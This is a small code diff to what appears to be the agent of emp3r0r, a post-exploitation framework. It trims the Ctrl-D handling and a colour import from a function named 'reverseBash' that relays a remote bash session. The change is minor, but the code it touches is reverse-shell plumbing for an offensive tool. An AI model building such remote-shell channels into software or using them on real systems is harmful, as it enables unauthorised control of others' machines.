@@ -11,7 +11,6 @@ import (
 	"syscall"
 
 	"github.com/creack/pty"
-	"github.com/fatih/color"
 	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
 )
 
@@ -171,10 +170,6 @@ func reverseBash(ctx context.Context, send chan []byte, recv chan []byte) {
 			_, err := consoleReader.Read(buf)
 			if err != nil {
 				CliPrintWarning("Bash read input: %v", err)
-				return
-			}
-			if buf[0] == 4 { // Ctrl-D is 4
-				color.Red("EOF")
 				return
 			}
 
